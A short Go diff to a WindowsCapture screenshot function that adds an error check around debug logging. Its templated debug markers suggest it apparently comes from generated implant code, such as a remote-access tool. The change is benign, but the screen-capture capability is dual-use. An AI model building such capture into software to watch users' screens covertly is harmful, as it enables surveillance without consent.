@@ -47,9 +47,11 @@ func WindowsCapture() []byte {
 	}
 	img, err := screen.Capture(0, 0, width, height)
 
-	//{{if .Config.Debug}}
-	log.Printf("Error Capture: %s", err)
-	//{{end}}
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Printf("Error Capture: %s", err)
+		//{{end}}
+	}
 
 	var buf bytes.Buffer
 	if err != nil {
